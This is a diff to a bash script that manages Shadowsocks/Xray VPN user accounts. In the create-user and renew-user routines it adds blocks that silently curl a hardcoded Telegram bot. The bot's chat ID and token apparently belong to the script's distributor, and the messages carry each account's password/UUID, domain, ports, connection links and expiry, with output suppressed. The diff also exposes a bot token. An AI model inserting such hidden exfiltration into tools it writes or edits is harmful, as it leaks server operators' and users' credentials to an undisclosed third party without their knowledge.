@@ -353,6 +353,42 @@ if [[ "${DATADB}" != '' ]]; then
   sed -i "/\b${user}\b/d" /etc/shadowsocks/.shadowsocks.db
 fi
 echo "##@ ${user} ${exp} ${uuid} ${quota} ${limit}" >>/etc/shadowsocks/.shadowsocks.db
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+┌───────────────────────────┐
+│    • CREATE SSWS USER •               
+└───────────────────────────┘
+┌───────────────────────────┐
+  Remarks     : <code>${user}</code>
+  Expired On  : <code>$exp</code>
+  Domain      : <code>${domain} </code>
+  Quota       : <code>${quota} GB </code>
+  Limit IP    : <code>${limit} USER</code>
+  Port TLS    : <code>${tls} </code>
+  Port  GRPC  : <code>${tls}</code>
+  Password    : <code>${uuid}</code>
+  Cipers      : <code>aes-128-gcm</code>
+  Network     : <code>ws/grpc </code>
+  Path        : <code>/ss-ws</code>
+  ServiceName : <code>ss-grpc  </code>
+└───────────────────────────┘
+┌───────────────────────────┐
+  Link TLS : 
+  <code>${shadowsockslink} </code>
+  
+  Link GRPC : 
+  <code>${shadowsockslink1} </code>
+  
+  Link JSON : <code>http://${domain}:81/ss-ws/ss-$user.txt</code>
+└───────────────────────────┘
+┌─────────── BY ────────────┐
+│       • Free-Wifi •                 
+└───────────────────────────┘
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
 echo -e "$COLOR1│${NC} ${COLBG1}             • CREATE SSWS USER •              ${NC} $COLOR1│$NC"
@@ -435,6 +471,26 @@ exp3=$(($exp2 + $masaaktif))
 exp4=`date -d "$exp3 days" +"%Y-%m-%d"`
 sed -i "/## $user/c\## $user $exp4" /etc/xray/config.json
 systemctl restart xray > /dev/null 2>&1
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="
+┌───────────────────────────┐
+│    • RENEW SSWS USER •               
+└───────────────────────────┘
+┌───────────────────────────┐
+$user Account Renewed Successfully
+
+Client Name : <code>$user</code>
+Days Added  : <code>$masaaktif Days</code>
+Expired On  : <code>$exp4</code>
+└───────────────────────────┘
+┌─────────── BY ────────────┐
+│       • Free-Wifi •                 
+└───────────────────────────┘
+"
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
 echo -e "$COLOR1│${NC} ${COLBG1}              • RENEW SSWS USER •              ${NC} $COLOR1│$NC"
